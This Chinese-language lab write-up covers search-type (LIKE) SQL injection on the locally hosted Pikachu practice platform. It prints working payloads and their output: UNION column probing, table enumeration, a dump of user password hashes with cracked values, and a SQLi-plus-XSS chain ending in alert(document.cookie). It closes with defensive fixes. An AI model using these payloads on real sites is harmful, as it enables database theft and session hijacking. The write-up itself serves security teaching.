---
layout: post
title: Pikachu - SQL注入 搜索型注入 Writeup（LIKE 注入与漏洞组合）
platform: pikachu
date: 2026-10-27 22:30:00 +0800
categories: CTF
---

Pikachu - SQL注入 搜索型注入 Writeup（LIKE 注入与漏洞组合）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SQL-Inject → 搜索型注入
- 地址：`http://localhost/pikachu/vul/sqli/sqli_search.php`
- 题型：Web
- 考点：**LIKE 模糊查询注入**、通配符、**SQL 注入 + XSS 组合利用**

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu / root / root
```

**页面形态**：

```text
请输入用户名进行查找
如果记不住用户名，输入用户名的一部分搜索的试试看?

[ 文本框            ]  [ 搜索 ]

用户名中含有 vin 的结果如下：
username：vince
uid:1
email is: vince@pikachu.com
```

**作者提示**：

```html
data-content="%%"
```

**★ 只有两个百分号 —— 提示你注意 `like '%$name%'` 里的通配符。**

**✅ 实测结果（9 种输入）**

| # | 输入 | 结果 |
|---|---|---|
| 1 | `vince` | 1 条：vince |
| 2 | `vin` | **2 条：vince + kevin**（模糊匹配）|
| 3 | `zzz` | 无结果 |
| 4 | **`vince' or 1=1 #`** | **7 条（全部）** ✅ |
| 5 | **`vince%' or 1=1 #`** | **7 条** ✅ |
| 6 | **`vince%' or 1=1 -- `** | **7 条** ✅ |
| 7 | **`v_nce`** | **1 条：vince**（`_` 通配单个字符）|
| 8 | **`v%`** | **2 条：vince + kevin**（`%` 通配任意字符）|
| 9 | `-1' union select 1,2 #` | **报错：`The used SELECT statements have a different number of columns`** |
| 10 | **`-1' union select 1,2,3 #`** | **1 \| 2 \| 3（3 列）** ✅ |
| 11 | **`-1' union select group_concat(concat(username,':',substr(password,1,8))),2,3 from users #`** | **`admin:e10adc39,pikachu:670b1472,test:e99a18c4`** ✅ |

**额外发现（组合利用）**：

| 输入 | 结果 |
|---|---|
| `<script>alert(1)</script>` | 无结果，**不弹窗** |
| **`vince%' or 1=1 #<script>alert(1)</script>`** | **7 条 + 页面原样输出 payload → 弹窗** ✅ |

二、题目分析

**① 后端代码：两个漏洞**

```php
<?php
// sqli_search.php 第 24-45 行
if(isset($_GET['submit']) && $_GET['name'] != null){

    //这里没有做任何处理，直接拼到select里面去了
    $name = $_GET['name'];

    //这里的变量是模糊匹配，需要考虑闭合
    $query = "select username,id,email from member where username like '%$name%'";   // ★ 漏洞 1：SQL 注入
    $result = execute($link, $query);

    if(mysqli_num_rows($result) >= 1){
        //彩蛋:这里还有个xss
        $html2 .= "<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";   // ★ 漏洞 2：反射型 XSS

        while($data = mysqli_fetch_assoc($result)){
            $uname = $data['username'];
            $id    = $data['id'];
            $email = $data['email'];
            $html1 .= "<p class='notice'>username：{$uname}<br />uid:{$id} <br />email is: {$email}</p>";
        }
    }else{
        $html1 .= "<p class='notice'>0o。..没有搜索到你输入的信息！</p>";
    }
}
?>
```

**★ 两个漏洞，作者自己标了"彩蛋"**：

```
① like '%$name%'        → 搜索型 SQL 注入
② {$_GET['name']}       → 反射型 XSS（在有结果时输出）
```

**② 搜索型和字符型的三个区别**

| | 字符型（上一关） | **搜索型（本关）** |
|---|---|---|
| SQL 形式 | `where username='$name'` | `where username like '%$name%'` |
| 要闭合什么 | 单引号 `'` | **引号 + 百分号 `'%`** |
| 查询列数 | `select id,email` = **2 列** | `select username,id,email` = **3 列** |
| 匹配方式 | 精确匹配 | **模糊匹配**（`%` 通配）|

**★ 最容易踩的坑是"列数"**：前两关都是 2 列，这一关变成 3 列。

**③ LIKE 的两个通配符（本关的"额外考点"）**

```sql
where username like 'v_nce'      -- _ 匹配【任意单个字符】→ vince
where username like 'v%'         -- % 匹配【任意长度字符串】→ vince, kevin
where username like '%in%'       -- 包含 in → vince, kevin
```

**★ 这两个通配符本来是给"用户搜索"用的**：

```
用户输入 v%     → 想搜"以 v 开头的"
用户输入 v_nce  → 想搜"v 后面跟任意一个字符再 nce"
```

**★ 但它们的副作用是**：

```
用户可以控制"匹配模式"本身
→ 这是 LIKE 注入"更容易"的原因之一
```

**④ 闭合分析：为什么 payload 里带 `%`**

**SQL 结构**：

```sql
where username like '%$name%'
                     └┬┘    └┬┘
                   SQL 的%   SQL的%
```

**输入 `vince%' or 1=1 #`**：

```sql
like '%vince%' or 1=1 #%'
     └───┬───┘└──┬──┘ └┬┘
   %vince%   注入   注释掉末尾 %'
```

**★ 拆解**：

```
① '%vince%'   → 第一个 % 来自 SQL，第二个 % 来自你的输入
                 → 匹配"包含 vince 的字符串"
② or 1=1      → 恒真
③ #           → 注释掉 SQL 末尾的 %'
```

**★ 实测发现：`%` 其实**不是必须的****：

```
vince' or 1=1 #     → 也返回 7 条 ✅
```

**★ 为什么？**

```sql
like '%vince' or 1=1 #%'
     └──┬──┘
   字符串是 %vince（少了结尾的 %）
   → 但 or 1=1 让条件恒真，匹配模式已经无所谓了
```

**★ 结论**：

```
两种都能打：
    vince' or 1=1 #      → 更短（推荐先试这个）
    vince%' or 1=1 #     → 更"贴合原意"（作者提示的写法）
```

**⑤ 列数必须探（本关是 3 列）**

**查询**：

```sql
select username,id,email from member ...
        └───┬────┘└┬┘└─┬─┘
           3 列
```

**★ 所以 union 必须写 3 列。**

**列数写错会怎样？**

**实测**（输入 `-1' union select 1,2 #`）：

```
页面末尾显示：
    The used SELECT statements have a different number of columns
```

**★ 这个报错是"探列数"的金矿**：

```
报错 → 列数不对 → 加一列再试
不报错且显示 1,2,3 → 列数是 3
```

**★ 为什么报错会显示出来？**

```php
// inc/mysql.inc.php
function execute($link, $query){
    $result = mysqli_query($link, $query);
    if(mysqli_errno($link)){
        exit(mysqli_error($link));      // ★ 直接把 MySQL 错误信息输出并终止
    }
    return $result;
}
```

**★ 这本身就是一个"信息泄露"问题**：

```
生产环境绝不能把 mysqli_error() 直接输出给用户
→ 攻击者靠报错信息就能推断表结构、列数、甚至直接读数据（报错注入）
```

**⑥ ⭐ 组合利用：SQL 注入 + XSS 互相配合**

**单独用 XSS payload 不成功**：

```
输入：<script>alert(1)</script>
→ 搜不到任何用户 → 走 else 分支 → payload 不被输出 → 不弹窗
```

**★ 原因**：

```php
if(mysqli_num_rows($result) >= 1){
    $html2 .= "...{$_GET['name']}...";     // ★ 只有"有结果"时才输出
}
```

**★ 解决办法**：**用 SQL 注入让结果非空，同时把 XSS 塞进去**：

```
输入：vince%' or 1=1 #<script>alert(1)</script>
```

**实测结果**：

```
结果条数: 7
页面含原样 <script>alert(1)</script>: True
回显: 用户名中含有 "vince%' or 1=1 #<script>alert(1)</script>" 的结果如下
                                                └──────┬──────┘
                                             原样输出 → 执行
```

**★ 这是两个漏洞的"化学反应"**：

```
SQL 注入   → 让 if 条件成立（有结果）
XSS        → 在 if 分支内部执行

★ 缺一个都不行
★ 这说明"漏洞组合"比"单个漏洞"危害更大
```

**★ 这也是真实渗透里常见的情况**：

```
A 漏洞帮 B 漏洞"打开局面"
比如：SQL 注入拿到管理员密码 → 登录后台 → 后台有存储型 XSS → 打其他管理员
```

三、解题步骤

**第 1 步：正常搜索（理解模糊匹配）**

```text
① 打开 http://localhost/pikachu/vul/sqli/sqli_search.php
② 输入：vince → 搜索 → 1 条（vince）
③ 输入：vin   → 搜索 → 2 条（vince + kevin）
④ 输入：zzz   → 搜索 → "没有搜索到你输入的信息！"
```

**★ 第 ③ 步证明这是 `like '%...%'` 模糊查询。**

**第 2 步：试通配符（本关特色）**

**输入**：

```
v_nce
```

**结果**：1 条（vince）

**★ `_` 匹配"任意单个字符" → `v_nce` 能匹配 vince。**

**输入**：

```
v%
```

**结果**：2 条（vince + kevin）

**★ `%` 匹配"任意长度" → 以 v 开头的都匹配。**

**第 3 步：SQL 注入（两种写法都试）**

**写法 1（简单）**：

```
vince' or 1=1 #
```

**写法 2（作者提示的，带 `%`）**：

```
vince%' or 1=1 #
```

**★ 两种都返回 7 条（我实测过）。**

**★ 如果 `#` 不生效**（地址栏手输时常见），用：

```
vince' or 1=1 -- 
vince%' or 1=1 -- 
```

**★ `--` 后面必须有空格。**

**第 4 步：探列数（本关是 3 列）**

**先试 2 列**：

```
-1' union select 1,2 #
```

**结果**：页面末尾报错

```
The used SELECT statements have a different number of columns
```

**★ 说明列数不是 2。**

**再试 3 列**：

```
-1' union select 1,2,3 #
```

**结果**：

```
username：1
uid:2
email is: 3
```

**★ 成功 → 确认是 3 列。**

**第 5 步：读库名、用户**

```
-1' union select database(),user(),3 #
```

**结果**：

```
username：pikachu
uid:root@localhost
email is: 3
```

**第 6 步：读表名**

```
-1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database() #
```

**结果**：

```
username：httpinfo,member,message,users,xssblind
uid:2
email is: 3
```

**第 7 步：拖 users 表**

```
-1' union select group_concat(concat(username,':',substr(password,1,8))),2,3 from users #
```

**结果**：

```
username：admin:e10adc39,pikachu:670b1472,test:e99a18c4
uid:2
email is: 3
```

**★ 用 `substr(password,1,8)` 只取前 8 位**，是为了避免 `group_concat` 结果太长超出显示长度（也可以用 `@@group_concat_max_len`）。

**★ 完整哈希（去掉 substr）**：

```
admin:e10adc3949ba59abbe56e057f20f883e      → 123456
pikachu:670b14728ad9902aecba32e22fa4f6bd    → 000000
test:e99a18c428cb38d5f260853678922e03       → abc123
```

**第 8 步：⭐ 组合利用（SQLi + XSS）**

**先试单独的 XSS**：

```
<script>alert(1)</script>
```

**结果**：没有搜索结果，**不弹窗**。

**再试组合 payload**：

```
vince%' or 1=1 #<script>alert(1)</script>
```

**结果**：

```
① 页面显示 7 个用户
② 同时弹窗 "1"        ← ★ XSS 生效
```

**★ 原理**：

```sql
select username,id,email from member
where username like '%vince%' or 1=1 #<script>alert(1)</script>%'
                                       └──────────┬──────────┘
                                    注释掉的这部分不影响
                                    
★ SQL 部分：or 1=1 → 7 条结果 → if 条件成立
★ 输出部分：{$_GET['name']} 原样输出整串 → <script> 执行
```

**第 9 步：完整 payload 汇总**

```sql
-- ① 判断注入
vince'

-- ② 注入（简单写法）
vince' or 1=1 #

-- ③ 注入（LIKE 写法，作者提示）
vince%' or 1=1 #

-- ④ 探列数（本关 3 列）
-1' union select 1,2,3 #

-- ⑤ 基本信息
-1' union select database(),user(),3 #

-- ⑥ 表名
-1' union select group_concat(table_name),2,3
   from information_schema.tables where table_schema=database() #

-- ⑦ 拖数据
-1' union select group_concat(concat(username,':',password)),2,3 from users #

-- ⑧ 组合利用（SQLi 让条件成立 + XSS 执行）
vince%' or 1=1 #<script>alert(document.cookie)</script>
```

四、延伸知识

**① LIKE 注入的特殊性**

**普通字符型**：

```sql
where username='$name'
```

**LIKE 型**：

```sql
where username like '%$name%'
```

**★ 三个不同点**：

```
① 多了两个 %（通配符）
   → 可以用 % 提前"吃掉" SQL 里的 %
   
② 匹配是"模糊"的
   → 你的 payload 只要"部分匹配"就可能命中
   
③ 用户能控制"匹配模式"
   → 输入 % 就能匹配所有
   → 输入 _ 就能匹配单个字符
   → 这本身就是一种"信息探测"手段
```

**★ 一个有趣的小技巧**：

```
输入：a%
→ 能列出所有以 a 开头的用户名
→ 这叫"枚举"（enumerate）
→ 在盲注场景很有用
```

**② 列数一定要探（不同查询列数不同）**

**本模块前几关的列数对比**：

| 关卡 | 查询 | 列数 |
|---|---|---|
| 数字型 | `select username,email` | 2 |
| 字符型 | `select id,email` | 2 |
| **搜索型** | `select username,id,email` | **3** |
| xx型 | 待测 | ? |

**★ 所以不能背"列数=2"，每关都要重新探。**

**★ 两种探列数方法**：

```sql
-- 方法 1：order by（简单）
vince' order by 3 #        → 报错 = 只有 2 列
vince' order by 2 #        → 正常

-- 方法 2：union（直接）
-1' union select 1,2 #     → 报错 = 列数不对
-1' union select 1,2,3 #   → 正常 = 3 列
```

**★ 报错信息是判断依据**：

```
The used SELECT statements have a different number of columns
                                    └──────┬──────┘
                              "列数不同"（英文报错要认识）
```

**③ 报错信息泄露（本关的一个附加问题）**

**看 `execute()` 实现**：

```php
function execute($link, $query){
    $result = mysqli_query($link, $query);
    if(mysqli_errno($link)){
        exit(mysqli_error($link));      // ★ 直接输出 MySQL 原始报错
    }
    return $result;
}
```

**★ 为什么危险**：

```
① 报错信息包含数据库结构线索
   "Unknown column '3' in 'order clause'"  → 知道列数
   "Table 'pikachu.xxx' doesn't exist"     → 知道表名
   
② 可以构造"报错注入"
   extractvalue(1, concat(0x7e, database()))
   → 数据从报错信息里带出来
   
③ 泄露数据库版本、路径
```

**★ 正确做法**：

```php
// ❌ 危险
if(mysqli_errno($link)) exit(mysqli_error($link));

// ✅ 安全：记日志，给用户看通用错误
if(mysqli_errno($link)) {
    error_log("SQL error: " . mysqli_error($link));
    exit("系统繁忙，请稍后重试");
}
```

**④ 漏洞组合利用（本关最有价值的点）**

**本关的组合**：

```
SQL 注入  →  让 if(mysqli_num_rows($result) >= 1) 成立
XSS       →  在 if 分支内输出执行
```

**★ 真实渗透中的常见组合**：

| 组合 | 效果 |
|---|---|
| **SQL 注入 + 任意文件读取** | 拿配置 → 拿数据库密码 → 拿服务器权限 |
| **SQL 注入 + 文件上传** | 注入 into outfile → 写 webshell |
| **SQL 注入 + 后台 XSS** | 打管理员 → 接管后台 |
| **XSS + CSRF** | 读 token → 伪造请求（绕过 CSRF token）|
| **SSRF + 内网服务** | 攻击内网 Redis/MySQL → getshell |
| **文件上传 + 文件包含** | 传图片马 → 包含执行 |
| **XXE + SSRF** | 读文件 + 打内网 |

**★ 核心思路**：

```
单点漏洞可能"打不通"
但两个漏洞互相配合，往往能"打开局面"

★ 渗透测试里叫"漏洞链"（Exploit Chain）
```

**⑤ 搜索型注入的防御**

**❌ 错误做法：转义**

```php
$name = mysqli_real_escape_string($link, $_GET['name']);
$query = "select ... where username like '%$name%'";
// 有效，但有编码问题（宽字节）
```

**❌ 更错的：只过滤通配符**

```php
$name = str_replace(['%', '_'], '', $name);
// 绕过：用 \ 转义 % ？
// 或者：不用通配符也能注入（or 1=1）
```

**✅ 正确做法 1：预处理**

```php
$stmt = $link->prepare("select username,id,email from member where username like ?");
$pattern = '%' . $name . '%';           // ★ 通配符加在"参数值"里，不在 SQL 里
$stmt->bind_param('s', $pattern);
$stmt->execute();
```

**★ 关键**：

```
通配符 % 应该加在【绑定参数的值】里
而不是拼在【SQL 语句】里

★ 这样 % 就被当成"普通字符"处理（sql_mode 允许时）
★ 或者用 ESCAPE 子句显式处理
```

**✅ 正确做法 2：显式处理通配符（如果必须模糊匹配）**

```php
$escaped = str_replace(['\\', '%', '_'], ['\\\\', '\\%', '\\_'], $name);
$query = "select ... where username like '%$escaped%' ESCAPE '\\'";
```

**★ 这样用户输入的 `%` 会被当成字面百分号，不会变成通配符。**

**✅ 正确做法 3：限定匹配方式**

```php
// 只允许"前缀匹配"，且校验输入只含字母数字
if (!preg_match('/^[a-zA-Z0-9]+$/', $name)) die("非法输入");
$stmt = $link->prepare("select ... where username like ?");
$pattern = $name . '%';      // 只允许前缀匹配
```

**⑥ XSS 防御（本关的第二个漏洞）**

**问题代码**：

```php
$html2 .= "<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";
```

**修复**：

```php
$safe = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
$html2 .= "<p class='notice'>用户名中含有{$safe}的结果如下：<br />";
```

**★ 只需要两行代码，两个漏洞都能修**（配合预处理）。

五、总结

- **本题核心：`like '%$name%'` 模糊查询注入；同时页面还回显 `$_GET['name']` → 附带一个反射型 XSS。**

- **一行漏洞代码**：

```php
$query = "select username,id,email from member where username like '%$name%'";
```

- **⭐ 五个必记要点**：

```text
① LIKE 注入要闭合 "引号 + 百分号"
   like '%$name%'  →  vince%' or 1=1 #
   ★ 但 vince' or 1=1 # 也有效（% 不是必须的）

② 列数每关都要重新探
   数字型 2 列、字符型 2 列、搜索型 3 列
   ★ 报错 "different number of columns" = 列数不对

③ 通配符 % 和 _ 是"用户可控制的匹配模式"
   v%     → 以 v 开头的
   v_nce  → v+任意1字符+nce

④ 报错信息会泄露数据库结构
   "different number of columns" → 知道列数
   ★ 报错注入的基础

⑤ ⭐ 组合利用：两个漏洞互相打开局面
   单独 XSS → 搜不到结果 → 不输出 → 不弹窗
   SQL 注入 + XSS → 有结果 + 输出 → 弹窗
```

- **实测数据**：

```text
vince                       → 1 条
vin                         → 2 条（vince + kevin）★ 模糊匹配
zzz                         → 无结果
v_nce                       → 1 条（_ 通配单字符）
v%                          → 2 条（% 通配任意）

vince' or 1=1 #             → 7 条（% 可省）
vince%' or 1=1 #            → 7 条
vince%' or 1=1 --           → 7 条

-1' union select 1,2 #      → 报错 "different number of columns"
-1' union select 1,2,3 #    → 1 | 2 | 3       ★ 3 列
-1' union select database(),user(),3 # → pikachu | root@localhost | 3
-1' union select group_concat(concat(username,':',substr(password,1,8))),2,3 from users #
   → admin:e10adc39,pikachu:670b1472,test:e99a18c4

<script>alert(1)</script>                       → 无结果，不弹窗
vince%' or 1=1 #<script>alert(1)</script>      → 7 条 + 弹窗 ✅ ★ 组合利用
```

- **SQL-Inject 模块进度**：

```text
✅ 数字型注入(post)      —— 无引号，直接塞条件
✅ 字符型注入(get)       —— 闭合单引号
✅ 搜索型注入            —— 本题：闭合 '%' + 组合 XSS
⬜ xx型注入              —— ('$x') 括号包裹
⬜ "insert/update"注入   —— 写操作注入
⬜ "delete"注入          —— 删除操作注入
⬜ "http header"注入     —— User-Agent / Referer
⬜ 盲注(base on boolean) —— 只有真假两种状态
⬜ 盲注(base on time)    —— 用 sleep 判断
⬜ 宽字节注入            —— GBK 编码绕过 addslashes
```

**手工复现要点**：

```text
· 输入 vin → 看模糊匹配（2 条）
· 输入 v_nce / v% → 看通配符效果
· 输入 vince' or 1=1 # → 7 条
· 输入 -1' union select 1,2 # → 看报错（列数不对）
· 输入 -1' union select 1,2,3 # → 1|2|3（3 列）
· 输入 -1' union select database(),user(),3 # → pikachu / root
· 输入 <script>alert(1)</script> → 不弹（无结果）
· 输入 vince%' or 1=1 #<script>alert(1)</script> → 7 条 + 弹窗
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  搜索型注入 = 字符型注入 + 通配符 %                            │
│                                                            │
│  要闭合：'%  （引号 + 百分号）                                │
│  要探列：本关是 3 列（不是 2 列！）                            │
│                                                            │
│  ★ 通配符 % 和 _ 是用户可控制的匹配模式                        │
│  ★ 报错信息会告诉你列数对不对                                  │
│  ★ 两个漏洞能互相配合：SQL 注入让 XSS 有机会执行                │
│                                                            │
│  正确防御：预处理 + 通配符转义 + 输出转义                        │
└────────────────────────────────────────────────────────────┘
```
